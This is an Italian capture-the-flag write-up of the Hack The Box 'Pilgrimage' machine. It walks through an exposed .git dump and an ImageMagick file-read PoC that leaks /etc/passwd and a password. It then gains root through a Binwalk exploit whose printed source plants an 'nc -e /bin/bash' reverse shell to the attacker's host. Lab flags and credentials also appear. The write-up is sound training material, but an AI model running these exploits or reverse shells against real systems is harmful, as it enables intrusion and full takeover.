**Target: 10.10.11.219

# INFORMATION GATHERING

Lanciamo un primo scan [Nmap](Note/Tool/Nmap.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/node]
└─# nmap -sC -sV -O --min-rate=5000 10.10.11.219
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-04 01:39 EDT
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/4%OT=22%CT=1%CU=30049%PV=Y%DS=2%DC=I%G=Y%TM=64A3B0A1
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
```

Uno scan su tutte le porte non ci fornice nessuna nuova porta

Quindi ricapitolando abbiamo due porta aperte

- 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5
- 80/tcp open  http    nginx 1.18.0

Nmap poi ci segnala una cartella git (.git ) che poi andremo a vedere

# ENUMERATION

Iniziamo dalla porta 80 

Dopo aver aggiunto pilgrimage.htb al nostro /etc/hosts procediamo a visitare il sito 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/pilgrimage.png)
Quando apriamo il sito web, vedremo una pagina che ha la funzionalità per ridurre un'immagine. E una pagina di accesso e registrazione.

solo per vedere cosa fa, ne abbiamo preso uno casuale e l'abbiamo ridotto. Il che ha generato un collegamento http://pilgrimage.htb/shrunk/64a29df7903fa.png, che indica che le immagini ridotte vengono salvate nel percorso /shrunk.

Passiamo alla directoy .git 

Possiamo scaricarla con il seguente comando 

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage]
└─# git-dumper  http://pilgrimage.htb/.git/ dump
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]

...<snip>...
```

Abbiano un po di cartelle e diversi file .php

```
┌──(root㉿kali)-[/home/kali/htb/pilgrimage/dump]
└─# ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

Dopo aver esaminato i diversi file .php troviamo quanto segue 

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage/dump]
└─# cat index.php | grep shrunk
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
``` 

ho cercato la parola 'shrunk' in quanto era la directory dove venivano salvati le immagine ridimensionata

dopo un po di ricerche su google troviamo questa [exploit](https://github.com/Sybil-Scan/imagemagick-lfi-poc) che sembra fare al caso nostro 

ImageMagick è vulnerabile alla divulgazione di informazioni. Quando analizza un'immagine PNG , l'immagine risultante potrebbe aver incorporato il contenuto di un file remoto arbitrario.

# EXPLOITATION

Segento del istruzione dell'exploit generiamo "exploit.png" che ci consentirà quindi di leggere il contenuto di un file remoto arbitrario.

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage/imagemagick-lfi-poc]
└─# python3 generate.py -f "/etc/passwd" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png

┌──(root㉿kali)-[/home/kali/htb/pilgrimage/imagemagick-lfi-poc]
└─# ls
exploit.png  generate.py  README.md
```

lo carichiamo sul sito 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/pilgrimange1.png)
e che lo scarichiamo tramite wget 

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage/imagemagick-lfi-poc]
└─# wget http://pilgrimage.htb/shrunk/64a3b91034df1.png
--2023-07-04 02:16:35--  http://pilgrimage.htb/shrunk/64a3b91034df1.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1688 (1.6K) [image/png]
Saving to: ‘64a3b91034df1.png’

64a3b91034df1.png                                          100%[=======================================================================================================================================>]   1.65K  --.-KB/s    in 0s

2023-07-04 02:16:35 (92.8 MB/s) - ‘64a3b91034df1.png’ saved [1688/1688]

```

Utilizziamo il comando "identify -verbose" per ottenere una panoramica completa delle proprietà tecniche di un'immagine, inclusi i dettagli del suo formato, dimensioni e attributi specifici.

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage/imagemagick-lfi-poc]
└─# identify -verbose 64a3b91034df1.png
Image: 64a3b91034df1.png
  Format: PNG (Portable Network Graphics)
  Geometry: 128x128
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Red:      8 bits
    Green:    8 bits
    Blue:     8 bits
  Channel Statistics:
    Red:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                 65278.00 (0.9961)
      Mean:                    11062.54 (0.1688)
      Standard Deviation:      15530.77 (0.2370)
    Blue:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.6Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 128x128+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 2
  Png:IHDR.bit-depth-orig: 8
  Raw profile type:

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

  Date:create: 2023-07-04T06:15:44+00:00
  Date:modify: 2023-07-04T06:15:44+00:00
  Date:timestamp: 2023-07-04T06:15:44+00:00
  Signature: 6eb1ce5d5108a4858c3cf5ba93eda43f449d4a7659a024a2e03436fe9a1f8771
  Tainted: False
  User Time: 0.010u
  Elapsed Time: 0m:0.007020s
  Pixels Per Second: 2.2Mi
```

Abbiamo il codice esadecimale che possiamo decodificare.
Dopo aver decodificato l'esadecimale, abbiamo scoperto che c'è un utente "emily" e dobbiamo trovare la password per accedere.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```

Cercando tra i file in dashboard.php ho trovato questo:

```bash

┌──(root㉿kali)-[/home/kali/htb/pilgrimage/dump]
└─# cat dashboard.php
<?php
session_start();
if(!isset($_SESSION['user'])) {
  header("Location: /login.php");
  exit(0);
}

function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
}
```

Vediamo si fa riferimento ad database `sqlite:/var/db/pilgrimage` 
Ora, allo stesso modo proveremo a leggere il file attraverso l'exploit per vedere se troviamo delle credenziali 

```bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
```

Carichiamo l'immagine come prima 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/pilgrimange2.png)
sempre con wget la riscarichiamo e la analizziamo con `identify`

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage/imagemagick-lfi-poc]
└─# identify -verbose 64a3bae5c854e.png
Image: 64a3bae5c854e.png
  Format: PNG (Portable Network Graphics)
  Geometry: 128x128
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component

...<snip>...

000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000180103172d65
6d696c796162696763686f6e6b79626f693132330a000000010ff7000ff7000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000

...<snip>...

```

Decodifichiamo sempre la il codice esadecimale e otteniamo quella che sembra essere un password:
emilyabigchonkyboi123

Abbiamo le nostre credianziali
emily:abigchonkyboi123

Ci colleghiamo via ssh

```bash

┌──(root㉿kali)-[/home/kali/htb/pilgrimage/imagemagick-lfi-poc]
└─# ssh emily@10.10.11.219
emily@10.10.11.219's password:
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul  4 20:50:21 2023 from 10.10.14.9
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
emily@pilgrimage:~$

```

e ci prendiamo la nostra flag user

```bash
emily@pilgrimage:~$ cat user.txt
f61097b2a5055ceb556aaa8525c00207
emily@pilgrimage:~$
```


# PRIVESC

Ci scarichiamo pspy64 sulla macchina target per vedere se ci sono processi interessanti, gli diamo i permessi ed eseguiamo.

```bash
emily@pilgrimage:~$ wget http://10.10.14.9:8000/pspy64
--2023-07-04 20:58:06--  http://10.10.14.9:8000/pspy64
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                     100%[=======================================================================================================================================>]   2.96M  1.04MB/s    in 2.9s

2023-07-04 20:58:09 (1.04 MB/s) - ‘pspy64’ saved [3104768/3104768]

emily@pilgrimage:~$ ls
pspy64  user.txt
emily@pilgrimage:~$ chmod +x pspy64
emily@pilgrimage:~$ ./pspy64
```

Notiamo questo `/bin/bash/usr/sbin/malwarescan.sh` che sembra essere interrensate

```bash
...<snip>...
2023/07/04 20:58:23 CMD: UID=0     PID=709    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
2023/07/04 20:58:23 CMD: UID=0     PID=703    | /bin/bash/usr/sbin/malwarescan.sh
2023/07/04 20:58:23 CMD: UID=103   PID=681    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
2023/07/04 20:58:23 CMD: UID=0     PID=679    | /usr/sbin/cron -f
...<snip>..
```

Diamogli un occhio 

```bash
emily@pilgrimage:/usr/sbin$ cat malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```


è uno script in esecuzione in background che utilizza binwalk. 
Vediamo la versione per vedere se ci sono vulnerabilità ad esso associata

Binwalk v2.3.2

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage]
└─# searchsploit  Binwalk v2.3.2
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)  python/remote/51249.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

Lo scarichiamo e come sempre ci diamo un occhio 

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage]
└─# searchsploit  -m 51249.py
  Exploit: Binwalk v2.3.2 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51249
     Path: /usr/share/exploitdb/exploits/python/remote/51249.py
    Codes: CVE-2022-4510
 Verified: False
File Type: ASCII text, with very long lines (614)
Copied to: /home/kali/htb/pilgrimage/51249.py

┌──(root㉿kali)-[/home/kali/htb/pilgrimage]
└─# cat 51249.py
# Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)
# Exploit Author: Etienne Lacoche
# CVE-ID: CVE-2022-4510
import os
import inspect
import argparse

print("")
print("################################################")
print("------------------CVE-2022-4510----------------")
print("################################################")
print("--------Binwalk Remote Command Execution--------")
print("------Binwalk 2.1.2b through 2.3.2 included-----")
print("------------------------------------------------")
print("################################################")
print("----------Exploit by: Etienne Lacoche-----------")
print("---------Contact Twitter: @electr0sm0g----------")
print("------------------Discovered by:----------------")
print("---------Q. Kaiser, ONEKEY Research Lab---------")
print("---------Exploit tested on debian 11------------")
print("################################################")
print("")

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Path to input .png file",default=1)
parser.add_argument("ip", help="Ip to nc listener",default=1)
parser.add_argument("port", help="Port to nc listener",default=1)

args = parser.parse_args()

if args.file and args.ip and args.port:
    header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']

    in_file = open(args.file, "rb")
    data = in_file.read()
    in_file.close()

    with open("/tmp/plugin", "w") as f:
       for line in lines:
          f.write(line)

    with open("/tmp/plugin", "rb") as f:
        content = f.read()

    os.system("rm /tmp/plugin")

    with open("binwalk_exploit.png", "wb") as f:
        f.write(data)
        f.write(header_pfs)
        f.write(content)

    print("")
    print("You can now rename and share binwalk_exploit and start your local netcat listener.")
    print("")                                                                                                                                                                                                                              
```

L'exploit ci permette di inserire una shell all'interno di un'immagine manipolata. Usando il Binwalk binario. 
Passando l'ip della nostra macchia e la porta su cui dobbiamo essere contattati dalla shell, creiamo l'immagine manipolata .

```bash
┌──(root㉿kali)-[/home/kali/htb/pilgrimage]
└─# python3 51249.py wolf.jpg 10.10.14.9 6969

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.

```

Dopo aver generato l'immagine manipolata utilizzando l'exploit, dobbiamo caricarla nel percorso "/var/www/pilgrimage.htb/shrunk/" sul server di destinazione. Ma prima ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 6969
listening on [any] 6969 ...
```

Carichiamo l'immagine manipolata  sulla macchina target 

```bash
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.9:8000/binwalk_exploit.png
--2023-07-04 21:19:22--  http://10.10.14.9:8000/binwalk_exploit.png
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 41118 (40K) [image/png]
Saving to: ‘binwalk_exploit.png’

binwalk_exploit.png                                        100%[=======================================================================================================================================>]  40.15K   199KB/s    in 0.2s

2023-07-04 21:19:22 (199 KB/s) - ‘binwalk_exploit.png’ saved [41118/41118]

```

e aspettiamo che il cronjob esegua ottenendo cosi la shell da root con la nostra flag

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.219] 38160
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
root@pilgrimage:~/quarantine# 
root@pilgrimage:/# cd root
cd root
cat root.txt
33248b6346767490911ccc28daaac78c
```

# LESSON LEARNED

Per avere l'accesso iniziale abbiamo sfruttato diversi errori 

1. Una directory nascosta  che non doveva essere esposta. All'interno abbiamo trovato i codici dell applicazione web che abbiamo potuto analizzare.

2. Una vulnerabilità  di Image Magick,  attraverso un manipolazioni di immagini  ci ha dato una  Arbitrary File Read e ci ha permesso di  leggere i file di sistema tra cui /etc/passwd ed estrarre utente e password per collegarci in ssh

Per la privesc 

1. Abbiamo sfruttato una vulnerabilità di binwalk presente all'interno di   `malwarescan.sh` un cronjob che veniva eseguito come root ogni  3 minuti 
